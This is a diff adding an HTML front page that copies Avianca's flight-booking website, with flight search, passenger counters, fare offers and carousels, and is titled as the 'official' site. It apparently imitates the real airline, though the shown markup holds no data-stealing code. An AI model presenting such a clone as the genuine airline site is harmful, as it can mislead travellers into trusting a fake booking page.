@@ -1,0 +1,949 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avianca - encuentra tiquetes vuelos baratos | Web oficial</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="shortcut icon" href="./assets/a.png" t ype="image/x-icon">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+        rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="./css/calendar.css">
+    <link rel="stylesheet" href="./css/main.css">
+    <link rel="stylesheet" href="./css/normalize.css">
+
+    <!-- START -->
+    <script src="./js/functions.js"></script>
+</head>
+
+<body class="sb-hidden">
+
+    <!-- ON LOADER -->
+    <div class="loader show">
+        <img class="" src="./assets/svg/plane-loader.gif">
+    </div>
+
+    <!-- ON CONVERS | DESTINATIONS -->
+    <div class="cover" id="cover-destinations">
+        <div class="cover--main">
+            <div class="cover--header">
+                <a id="close-modal"><img src="./assets/svg/left_arrow.png" class=""></a>
+                <h2 id="search-label">Origen</h2>
+                <a id="close-modal"><img src="./assets/svg/x_icon.png"></a>
+            </div>
+
+            <div class="cover--body">
+                <div class="search--input--container">
+                    <input type="text" class="search--input">
+                    <img class="search--input--icon" src="./assets/svg/takeoff_icon.png">
+                    <span id="search-input-label" class="search--input--label">Origen</span>
+                </div>
+                <div id="destinations">
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+
+    <!-- ON COVER | FLIGHT RESUME -->
+    <div class="cover" id="cover-resume">
+        <div class="cover--main">
+            <div class="cover--header">
+                <a id="close-modal"><img src="./assets/svg/left_arrow.png" class=""></a>
+                <h2 id="search-label">Reserva tu vuelo</h2>
+                <a id="close-modal"><img src="./assets/svg/x_icon.png"></a>
+            </div>
+
+            <div class="cover--body">
+                <div class="main--card--header" id="resume-type-selector">
+
+                </div>
+
+                <div class="mt-3" id="resume-destinations-selector">
+
+                </div>
+
+                <div class="main--input-group mt-3">
+                    <input class="d-none" type="date" id="date-go" readonly onclick="calender(this, 'go')">
+                    <button class="btn-ig" id="btn-date-go" onclick="document.querySelector('#date-go').click();">
+                        <img class="btn-ig-icon" src="./assets/svg/date-icon.png">
+                        <span class="btn-ig-label">Ida</span>
+                        <span class="btn-ig-text" id="btn-date-go-label">01/01/2001</span>
+                    </button>
+
+
+                    <input class="d-none" type="date" id="date-back" readonly onclick="calender(this, 'back')">
+                    <button class="btn-ig d-none" id="btn-date-back"
+                        onclick="document.querySelector('#date-back').click()">
+                        <img class="btn-ig-icon" src="./assets/svg/date-icon.png">
+                        <span class="btn-ig-label">Vuelta</span>
+                        <span class="btn-ig-text" id="btn-date-back-label">01/01/2001</span>
+                    </button>
+                </div>
+
+                <div class="main--input-group mt-3">
+                    <button class="btn-ig" id="btn-passengers">
+                        <img class="btn-ig-icon" src="./assets/svg/add-passenger-icon.png">
+                        <span class="btn-ig-text" id="btn-passengers-label">1</span>
+                    </button>
+                </div>
+
+                <button id="btn-next-step" class="btn btn-black mt-3 w-100">
+                    Buscar
+                </button>
+                
+            </div>
+        </div>
+    </div>
+
+
+
+    <!-- ON COVER | PASSENGERS -->
+    <div class="cover " id="cover-passengers">
+        <div class="cover--main">
+            <div class="cover--header">
+                <a id="close-modal"><img src="./assets/svg/left_arrow.png"></a>
+                <h2 id="search-label">Pasajeros</h2>
+                <a id="close-modal"> <img src="/assets/svg/x_icon.png"></a>
+            </div>
+
+            <div class="cover--body">
+
+                <div class="main--input-group mt-3">
+                    <button class="btn-ig" id="btn-passengers">
+                        <img class="btn-ig-icon" src="./assets/svg/add-passenger-icon.png">
+                        <span class="btn-ig-text" id="btn-passengers-label">1</span>
+                    </button>
+                </div>
+
+                <div class="passenger-selector mt-5">
+                    <div>
+                        <p class="text-normal">Adultos</p>
+                        <p class="text-thin">Desde 12 años</p>
+                    </div>
+                    <div class="passenger-btn">
+                        <img src="./assets/svg/remove-icon.png" style="height: 23px;" onclick="rmP('adult');">
+                        <h1 id="adults-label">1</h1>
+                        <img src="./assets/svg/add-icon.png" onclick="addP('adult');">
+                    </div>
+                </div>
+
+                <div class="passenger-selector">
+                    <div>
+                        <p class="text-normal">Niños</p>
+                        <p class="text-thin">De 2 a 11 años</p>
+                    </div>
+                    <div class="passenger-btn">
+                        <img src="./assets/svg/remove-icon.png" style="height: 23px;" onclick="rmP('child');">
+                        <h1 id="children-label">0</h1>
+                        <img src="./assets/svg/add-icon.png" onclick="addP('child');">
+                    </div>
+                </div>
+
+                <div class="passenger-selector">
+                    <div>
+                        <p class="text-normal">Bebés</p>
+                        <p class="text-thin">Menores de 2 años</p>
+                    </div>
+                    <div class="passenger-btn">
+                        <img src="./assets/svg/remove-icon.png" style="height: 23px;" onclick="rmP('baby');">
+                        <h1 id="babies-label">0</h1>
+                        <img src="./assets/svg/add-icon.png" onclick="addP('baby');">
+                    </div>
+                </div>
+
+                <button class="btn btn-black mt-3 w-100" onclick="btnCloseModal[0].click(); btnSearchFlight.click()">
+                    Confirmar
+                </button>
+            </div>
+        </div>
+    </div>
+
+
+
+
+    <!-- NAVBAR -->
+    <nav class="navbar">
+
+        <div class="navbar--logo-desktop" style="text-align: center; margin: 0 100px;">
+            <a href="#" style="display: inline-block; margin-right: 40px; text-decoration: none; color: black;"><img
+                    src="./assets/logos/logoavianca-newbrand-rojo-1-l.svg" alt="left"></a>
+            <a href="#" style="display: inline-block; margin-right: 40px; text-decoration: none, color: black;">Reserva
+                tu vuelo</a>
+            <a href="" style="display: inline-block; margin-right: 50px; text-decoration: none; color: black;">Ofertas y
+                destinos</a>
+            <a href="#" style="display: inline-block; margin-right: 40px; text-decoration: none; color: black;">Tu
+                reserva <button
+                    style="font-size: 10px; background-color: blue; color: white; border: none; border-radius: 8px; padding: 3px 8px; margin-left: 10px;">check-in</button></a>
+            <a href="https://ayuda.avianca.com/hc/es" style="text-decoration: none; color: black;">Información y
+                ayuda</a>
+            <a href="" style="text-decoration: none; color: black;"><button
+                    style="font-size: 12px; background-color: white; color: black; border: 1px solid black; border-radius: 20px; padding: 5px 15px;">Avianca
+                    UATP Card</button></a>
+        </div>
+        <div class="navbar--logo-mobile" style="text-align: center; display: none;"><input type="checkbox"
+                id="menu-toggle"><label for="menu-toggle">&#9776;</label>
+            <div class="menu"><a href="#">Reserva tu vuelo</a>
+                <a href="#">Ofertas y destinos</a>
+                <a href="#">Tu reserva</a>
+                <a href="#">Información y ayuda</a>
+                <a href="#">Avianca UATP Card</a>
+            </div>
+        </div>
+        <style>
+            @media screen and (max-width: 600px) {
+                .navbar--logo-desktop {
+                    display: none;
+                }
+
+                .navbar--logo-mobile {
+                    display: block;
+                    margin: 0 20px;
+                }
+
+                .navbar--logo-mobile input[type="checkbox"] {
+                    display: none;
+                }
+
+                .navbar--logo-mobile label {
+                    display: block;
+                    cursor: pointer;
+                    font-size: 25px;
+                    line-height: 25px;
+                    padding: 10px;
+                }
+
+                .menu {
+                    display: none;
+                    position: absolute;
+                    top: 100%;
+                    left: 0;
+                    background-color: white;
+                    border: 1px solid black;
+                    border-top: none;
+                    width: 100%;
+                }
+
+                .menu a {
+                    display: block;
+                    padding: 10px;
+                    text-align: center;
+                    text-decoration: none;
+                    color: black;
+                }
+
+                .navbar--logo-mobile input[type="checkbox"]:checked+.menu {
+                    display: block;
+                }
+            }
+
+            .check-in {
+                background-color: #007bff;
+                color: white;
+                font-size: 12px;
+                padding: 3px 8px;
+                border-radius: 10px;
+            }
+        </style>
+
+    </nav>
+
+    <div style="height: .375rem; align-self: center;">
+        <div id="menu"
+            style="position:fixed;top:0;right:-100%;width:90%;height:100vh;background-color:#fff;z-index:1000;transition:all 0.3s; padding: 20px;box-shadow:-2px 0 5px rgba(0,0,0,0.2); overflow-y: none; overflow-x: none;">
+
+            <!-- Botón de cerrar -->
+            <button id="close-btn"
+                style="background:none;border:none;position:absolute;top:15px;right:15px;font-size:28px;cursor:pointer;color:#333;z-index:1100;">
+                ✖
+            </button>
+
+            <!-- Logo Avianca -->
+            <img src="./assets/logos/avianca_full.svg" alt="Logo"
+                style="max-height:40px; display:block; margin-left: 20px; margin-bottom: 20px;">
+
+            <!-- Navegación -->
+            <nav style="display:flex;flex-direction:column;margin-top:10px;">
+                <a href='#link1' style='padding:15px 20px;color:#333;text-decoration:none;'>Reservar</a>
+                <hr style='width:100%;border:none;border-top:1px solid #ddd;'>
+
+                <a href='#link2' style='padding:15px 20px;color:#333;text-decoration:none;'>Ofertas y destinos</a>
+                <hr style='width:100%;border:none;border-top:1px solid #ddd;'>
+
+                <a href='#link3'
+                    style='padding:15px 20px;color:#333;text-decoration:none;display:flex;justify-content:space-between;'>Tu
+                    reserva
+                    <span
+                        style="font-size:12px;background-color:blue;color:white;border-radius:8px;padding:3px 8px;">Check-in</span>
+                </a>
+                <hr style='width:100%;border:none;border-top:1px solid #ddd;'>
+
+                <a href='#link4' style='padding:15px 20px;color:#333;text-decoration:none;'>Información y ayuda</a>
+                <hr style='width:100%;border:none;border-top:1px solid #ddd;'>
+
+                <a href='#link5' style='padding:15px 20px;color:#333;text-decoration:none;'>Lifemiles</a>
+                <hr style='width:100%;border:none;border-top:1px solid #ddd;'>
+            </nav>
+        </div>
+
+        <!-- Botón para abrir el menú -->
+        <button id="menu-btn" class="button-menu">
+            <span style="display:block;width:25px;height:2px;background-color:#333;margin:5px 0;"></span>
+            <span style="display:block;width:25px;height:2px;background-color:#333;margin:5px 0;"></span>
+            <span style="display:block;width:25px;height:2px;background-color:#333;margin:5px 0;"></span>
+        </button>
+
+        <img class="logo-moviles" src="./assets/logos/logoavianca-newbrand-rojo-1.svg" alt="Logo" style=>
+    </div>
+    <script>
+        const menu = document.getElementById("menu");
+        const menuBtn = document.getElementById("menu-btn");
+        const closeBtn = document.getElementById("close-btn");
+
+        menuBtn.addEventListener("click", () => {
+            menu.style.left = "0";  // Mueve el menú a la vista
+            menuBtn.style.display = "none";  // Oculta el botón hamburguesa
+        });
+
+        closeBtn.addEventListener("click", () => {
+            menu.style.left = "-100%";  // Esconde el menú
+            menuBtn.style.display = "block";  // Muestra el botón hamburguesa de nuevo
+        });
+
+    </script>
+
+
+    <style>
+        @media (min-width: 768px) {
+
+            .mobile-menu,
+            #menu {
+                display: none !important;
+            }
+        }
+    </style>
+    <script>document.getElementById('menu-btn').addEventListener('click', function () { document.getElementById('menu').style.left = '0'; }); document.getElementById('close-btn').addEventListener('click', function () { document.getElementById('menu').style.left = '-100%'; });</script>
+
+    <br>
+    <br>
+
+    <section class="main">
+        <div class="sp-initial-content bg-main-card">
+            <div class="main--card">
+                <div id="main-type-selector" class="main--card--header">
+                    <form id="type-selector">
+                        <label class="radio-wrapper" for="ida_vuelta">
+                            <input type="radio" selected id="ida_vuelta" name="opcion_viaje"
+                                onclick="info.flightInfo.type = 1; updateLS(); updateDOM()">
+                            <div class="radio-circle">
+                                <div class="radio-dot"></div>
+                            </div>
+                            <span class="radio-label">Ida y vuelta</span>
+                        </label>
+
+                        <label class="radio-wrapper" for="solo_ida">
+                            <input type="radio" id="solo_ida" name="opcion_viaje"
+                                onclick="info.flightInfo.type = 2; updateLS(); updateDOM()">
+                            <div class="radio-circle">
+                                <div class="radio-dot"></div>
+                            </div>
+                            <span class="radio-label">Solo ida</span>
+                        </label>
+                    </form>
+                </div>
+                <div class="main--card--body">
+
+                    <div id="main-destinations-selector">
+                        <div class="main--input-group" id="destinations-selector">
+                            <button class="btn-ig" id="btn-origin">
+                                <img class="btn-ig-icon" src="./assets/svg/takeoff_icon.png">
+                                <span class="btn-ig-label">Origen</span>
+                                <span class="btn-ig-text" id="btn-origin-label">Quito</span>
+                            </button>
+
+                            <img class="fd-icon" src="./assets/svg/flight-direction-icon.png">
+
+                            <button class="btn-ig" id="btn-destination">
+                                <img class="btn-ig-icon" src="./assets/svg/landing_icon.png">
+                                <span class="btn-ig-label">Destino</span>
+                                <span class="btn-ig-text" id="btn-destination-label">Guayaquil</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <button id="search-flight" class="btn btn-black mt-3">
+                        Buscar
+                    </button>
+                </div>
+            </div>
+        </div>
+       
+
+        <style>
+            .main-banner_container.ng-star-inserted {
+                background-color: red;
+                color: #fff;
+                margin: 0;
+                padding: 30px;
+                box-sizing: border-box;
+            }
+
+            .button-main-banner {
+                display: flex;
+                margin: 0 auto;
+                margin-right: 10px;
+                justify-content: right;
+                border-radius: 25px;
+                border: none;
+                margin-top: 10px;
+                margin-bottom: 20px;
+                padding: .4375rem .875rem;
+                color: #000;
+                font-weight: 700;
+                background-color: #fff !important;
+                border-color: #fff;
+                cursor: pointer;
+            }
+        </style>
+
+        <div class="main--banner">
+            <div class="main--banner__img"></div>
+            <div class="main--banner__body">
+                <h1>¿Sigues esperando<br>
+                    una señal?</h1>
+                <p>¡Esta es! Reserva ya y vuela entre junio y noviembre de 2025</p>
+                <p class="price">Por trayecto desde<br><span>COP 49,900</span></p>
+                <button class="button-main-banner"
+                    onclick="window.location.href='ofertas-de-vuelos.html'">Reserva ahora</button>
+            </div>
+        </div>
+        </div>
+        </div>
+    </section>
+    <section class="cards--container">
+       <h3>Ofertas desde<a class="link-blue" _blank href=""><img width="15px"
+                    src="./assets/svg/down_blue_arrow.png">Bogota</a></h3>
+    </div>
+        <div class="card--travel card--bg--per">
+            <br><br><br><br><br><br><br><br>
+            <div
+                style="background-color: rgb(255, 255, 255, 0.623); color: black; width: 80%; max-width: 1320px; margin: 0 auto; padding: 20px; border-radius: 20px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); position: relative; text-align: left; margin-bottom: 10px; ">
+                <h2 style="margin-top: 0;">Quibdó</h2>
+                <p>Por trayecto desde</p>
+                <h1 style="position: absolute; top: 53px; right: 5px; font-size: 1.5em;">COP 245,900</h1>
+            </div>
+        </div>
+        <div class="card--travel card--bg--bga">
+            <br><br><br><br><br><br><br><br>
+            <div
+                style="background-color: rgb(255, 255, 255, 0.623); color: black; width: 80%; max-width: 1320px; margin: 0 auto; padding: 20px; border-radius: 20px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); position: relative; text-align: left; margin-bottom: 10px;">
+                <h2 style="margin-top: 0;">Ibague</h2>
+                <p>Por trayecto desde</p>
+                <h1 style="position: absolute; top: 43px; right: 5px; font-size: 1.5em;">COP 248.900</h1>
+            </div>
+        </div>
+        <div class="card--travel card--bg--med">
+            <br><br><br><br><br><br><br><br>
+            <div
+                style="background-color: rgb(255, 255, 255, 0.623); color: black; width: 80%; max-width: 1320px; margin: 0 auto; padding: 20px; border-radius: 20px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); position: relative; text-align: left; margin-bottom: 10px;">
+                <h2 style="margin-top: 0;">Cali</h2>
+                <p>Por trayecto desde</p>
+                <h1 style="position: absolute; top: 43px; right: 5px; font-size: 1.5em;">cop 258.900</h1>
+            </div>
+        </div>
+    
+        </div>
+        <br><br>
+
+        <!DOCTYPE html>
+        <!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+        <!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+        <!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+        <!--[if gt IE 8]>      <html class="no-js"> <!--<![endif]-->
+        <html>
+
+        <head>
+            <meta charset="utf-8">
+            <meta http-equiv="X-UA-Compatible" content="IE=edge">
+            <meta name="description" content="">
+            <meta name="viewport" content="width=device-width, initial-scale=1">
+            <link rel="stylesheet" href="">
+        </head>
+
+        <body>
+            <!--[if lt IE 7]>
+                    <p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="#">upgrade your browser</a> to improve your experience.</p>
+                <![endif]-->
+
+            <script src="" async defer></script>
+        </body>
+
+        </html>
+
+
+        <div>
+            <center>
+                <h2>Vuela como más te gusta</h2>
+            </center>
+        </div>
+        <br>
+        <div>
+
+            <style>
+                body {
+                    margin: 0
+                }
+
+                .container {
+                    display: flex;
+                    justify-content: center
+                }
+
+                .slider {
+                    display: flex;
+                    overflow-x: auto;
+                    scroll-snap-type: x mandatory;
+                    -webkit-overflow-scrolling: touch;
+                    margin: 20px
+                }
+
+                .slide {
+                    flex: 0 0 auto;
+                    scroll-snap-align: start;
+                    margin-right: 20px;
+                    text-align: center;
+                    border-radius: 20px;
+                    overflow: hidden;
+                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1)
+                }
+
+                .slide-content {
+                    padding: 10px;
+                    background-color: rgba(255, 255, 255, 0.8);
+                    box-sizing: border-box;
+                    border-radius: 20px;
+                    max-width: 100%;
+                    text-align: center
+                }
+
+                .text-container {
+                    max-width: 100%;
+                    margin: 0 auto
+                }
+
+                .text-container h2,
+                .text-container p {
+                    margin: 0;
+                    text-align: center
+                }
+            </style>
+            </head>
+
+            <body>
+
+                <div class="container">
+                    <div class="slider">
+                        <div class="slide">
+                            <img src="galeria/explora.webp" alt="Imagen 1">
+                            <div class="slide-content">
+                                <div class="text-container">
+                                    <h3>Inspírate</h3>
+                                    <p>Explora nuestros destinos y planifica</p>
+                                    <p> tu próxima aventura. Aprovecha al</p> máximo tu próximo viaje.</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="slide"><img src="galeria/descubre.webp" alt="Imagen 2">
+                            <div class="slide-content">
+                                <div class="text-container">
+                                    <h3>experiencia avianca</h3>
+                                    <p>¡Listos para despegar! Descubra los</p>
+                                    <p>servicios a bordo que ofrecemos</p>
+                                    <p>cuando vuela con nostros.</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="slide"><img src="galeria/conoce.webp" alt="Imagen 3">
+                            <div class="slide-content">
+                                <div class="text-container">
+                                    <h3>millas de avianca</h3>
+                                    <p>Explora nuestros destinos y planifica</p>
+                                    <p> tu próxima aventura. Aprovecha al</p> máximo tu próximo viaje.</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="slide"><img src="galeria/enterate.webp" alt="Imagen 4">
+                            <div class="slide-content">
+                                <div class="text-container">
+                                    <h3>equipaje</h3>
+                                    <p>Entérate de las condiciones que</p>
+                                    <p>debes tener en cuenta al momento</p>
+                                    <p>de preparar tu equipaje.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+        </div>
+        </div>
+        </div>
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+        <script>$(".slider").on("scroll", function () { if ($(this).scrollLeft() + $(this).innerWidth() >= $(this)[0].scrollWidth) { $(this).scrollLeft(0) } });</script>
+
+        </div>
+        <br>
+        <br>
+        <center>
+            <h2>Conoce nuestras novedades</a></h2>
+        </center>
+        <div style="margin: 5px;">
+            <style>
+                .custom-container {
+                    display: flex;
+                    justify-content: center;
+                    overflow: hidden;
+                    padding: 1px 20px;
+                    /* Espacio a los lados del carrusel */
+                }
+
+                .custom-slider {
+                    display: flex;
+                    overflow: hidden;
+                    scroll-snap-type: x mandatory;
+                    -webkit-overflow-scrolling: touch;
+                    width: calc(100% - 40px);
+                    /* Ajusta el ancho para el padding */
+                    position: relative;
+                    flex: 1;
+                }
+
+                .custom-slide {
+                    flex: 0 0 33.33%;
+                    /* Mostrar 3 slides en escritorio */
+                    scroll-snap-align: start;
+                    margin-right: 20px;
+                    text-align: left;
+                    border-radius: 20px;
+                    overflow: hidden;
+                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+                    position: relative;
+                    height: 150px;
+                    /* Altura reducida */
+                    background-size: cover;
+                    background-position: center;
+                }
+
+                .custom-slide-content {
+                    padding: 10px;
+                    box-sizing: border-box;
+                    position: absolute;
+                    top: 10px;
+                    left: 10px;
+                    background-color: transparent;
+                    /* Fondo transparente */
+                    border-radius: 10px;
+                    color: white;
+                }
+
+                .custom-text-container h3,
+                .custom-text-container p {
+                    margin: 0;
+                    text-align: left;
+                }
+
+                .custom-button-reserva {
+                    display: inline-block;
+                    margin-top: 10px;
+                    padding: 10px 20px;
+                    border: none;
+                    border-radius: 10px;
+                    cursor: pointer;
+                    text-align: center;
+                }
+
+                .custom-button-reserva.black1 {
+                    background-color: #ffffff;
+                    color: #0f0f0f;
+                }
+
+                .custom-button-reserva.black {
+                    background-color: #030303;
+                    color: #ffffff;
+                }
+
+                .custom-button-reserva.white {
+                    background-color: #000000;
+                    color: #fffbfb;
+                }
+
+                .custom-button-reserva.white1 {
+                    background-color: #ffffff;
+                    color: #0f0f0f;
+                }
+
+                .custom-button-reserva:hover {
+                    opacity: 0.8;
+                }
+
+                @media (max-width: 768px) {
+                    .custom-slide {
+                        flex: 0 0 100%;
+                        /* Mostrar 1 slide en móviles */
+                        height: 200px;
+                        /* Altura mayor en móviles */
+                    }
+                }
+            </style>
+
+            <div class="custom-container">
+                <div class="custom-slider">
+                    <div class="custom-slide"
+                        style="background-image:url('galeria/fotografia_mujer_lifemiles-red-plus-elite.png');">
+                        <div class="custom-slide-content">
+                            <div class="custom-text-container">
+                                <h3>Volando Por Colombia</h3>
+                                <p>puedes obtener tu estatus</p>
+                                <h3>red plus elite</h3>
+
+
+                                <button class="custom-button-reserva black1">Suscríbete ya</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="custom-slide"
+                        style="background-image:url('galeria/fotografia_personas_lifemiles-duplica-millas.png');">
+                        <div class="custom-slide-content">
+                            <div class="custom-text-container">
+                                <h3>duplica tus millas volando</h3>
+                                <p>por colombia con tarifas</p>
+                                <h3>classic y flex</h3>
+
+
+                                <button class="custom-button-reserva white">Reserva ya</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="custom-slide" style="background-image:url('galeria/banner-star.jpg');">
+                        <div class="custom-slide-content">
+                            <div class="custom-text-container">
+                                <h3>algunos llegan al cielo,</h3>
+                                <p>nosotros volamos</p>
+                                <h3>entre las estrellas</h3>
+
+
+                                <button class="custom-button-reserva black">Conoce más</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="custom-slide" style="background-image:url('galeria/card_bussiness_es.png');">
+                        <div class="custom-slide-content">
+                            <div class="custom-text-container">
+                                <h3>vuela en </h3>
+                                <p>business class</p>
+                                <h3>y eleva tu experiencia</h3>
+
+
+                                <button class="custom-button-reserva white1">Descubre más</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+        <script>
+            $(document).ready(function () {
+                var $slider = $('.custom-slider');
+                var slideWidth = $('.custom-slide').outerWidth(true);
+                var totalSlides = $('.custom-slide').length;
+
+                // Clonamos los slides para crear un efecto de carrusel infinito
+                $('.custom-slider').append($('.custom-slider').html());
+
+                function animateSlides() {
+                    $slider.animate({
+                        scrollLeft: $slider.scrollLeft() + slideWidth
+                    }, 600, function () {
+                        if ($slider.scrollLeft() >= $slider[0].scrollWidth / 2) {
+                            $slider.scrollLeft(0);
+                        }
+                    });
+                }
+
+                setInterval(animateSlides, 3000); // Cambia cada 3 segundos
+            });
+        </script>
+
+        <div>
+            <h1>
+                <center>
+                    <div>Complementa tu experiencia</div>
+                </center>
+            </h1>
+        </div>
+
+
+        <div>
+
+            <style>
+                body {
+                    margin: 0
+                }
+
+                .container {
+                    display: flex;
+                    justify-content: center
+                }
+
+                .slider {
+                    display: flex;
+                    overflow-x: auto;
+                    scroll-snap-type: x mandatory;
+                    -webkit-overflow-scrolling: touch;
+                    margin: 20px
+                }
+
+                .slide {
+                    flex: 0 0 auto;
+                    scroll-snap-align: start;
+                    margin-right: 20px;
+                    text-align: center;
+                    border-radius: 20px;
+                    overflow: hidden;
+                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1)
+                }
+
+                .slide-content {
+                    padding: 10px;
+                    background-color: rgba(255, 255, 255, 0.8);
+                    box-sizing: border-box;
+                    border-radius: 20px;
+                    max-width: 100%;
+                    text-align: center
+                }
+
+                .text-container {
+                    max-width: 100%;
+                    margin: 0 auto
+                }
+
+                .text-container h2,
+                .text-container p {
+                    margin: 0;
+                    text-align: center
+                }
+            </style>
+            </head>
+
+            <body>
+
+                <div class="container">
+                    <div class="slider">
+                        <div class="slide">
+                            <img src="galeria1/icon-hoteles (1).svg" alt="Imagen 1">
+                            <div class="slide-content">
+                                <div class="text-container">
+                                    <h3>Reserva de hoteles</h3>
+                                    <p>Cientos de alojamientos con hasta</p>
+                                    <p>40% DCTO te esperan en</p>Booking.com.</p>
+                                </div>
+                                <br><button
+                                    style="background-color: white; color: black; border: 2px solid black; border-radius: 15px;">Reservar</button>
+                            </div>
+                        </div>
+                        <div class="slide"><img src="galeria1/icon-alquiler-autos (1).svg" alt="Imagen 2">
+                            <div class="slide-content">
+                                <div class="text-container">
+                                    <h3>experiencia avianca</h3>
+                                    <p>¡Listos para despegar! Descubra los</p>
+                                    <p>servicios a bordo que ofrecemos</p>
+                                    <p>cuando vuela con nosotros. <br><br><button
+                                            style="background-color: white; color: black; border: 2px solid black; border-radius: 15px;">Alquilar</button>
+                                        </nostros>
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="slide"><img src="galeria1/icon-civitatis (1).svg" alt="Imagen 3">
+                            <div class="slide-content">
+                                <div class="text-container">
+                                    <h3>millas de avianca</h3>
+                                    <p>Explora nuestros destinos y planifica</p>
+                                    <p> tu próxima aventura. Aprovecha al</p> máximo tu próximo viaje. <br><br><button
+                                        style="background-color: white; color: black; border: 2px solid black; border-radius: 15px;">Descubrir</button>
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+        </div>
+        </div>
+
+        <br>
+        <br>
+        <br>
+        <!-- FOOTER -->
+        <footer class="footer">
+            <div class="footer--main">
+                <div class="footer--logo">
+                    <img src="/assets/logos/avianca_negative .svg">
+                </div>
+
+                <p class="text-big mb-2">¡Síguenos!</p>
+                <img class="mb-5" width="200px" src="./assets/svg/social_media_icons.png">
+                <div class="footer--accordion mb-4">
+                    <div class="footer--accordion-item">
+                        <p>Vuelos baratos</p>
+                        <img src="./assets/svg/down_arrow.png">
+                    </div>
+                    <div class="footer--accordion-item">
+                        <p>Sobre nosotros</p>
+                        <img src="./assets/svg/down_arrow.png">
+                    </div>
+                    <div class="footer--accordion-item">
+                        <p>Nuestros portales</p>
+                        <img src="./assets/svg/down_arrow.png">
+                    </div>
+                    <div class="footer--accordion-item">
+                        <p>Enlaces rápidos</p>
+                        <img src="./assets/svg/down_arrow.png">
+                    </div>
+                </div>
+            </div>
+
+            <hr width="99%">
+
+            <div class="footer--end">
+                <p>Copyright © Avianca 2024</p>
+                
+            </div>
+        </footer>
+        
+
+
+
+        
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+        <script src="./js/calendar.js"></script>
+        <script src="./js/index.js"></script>
+
+</body>
+
+</html>
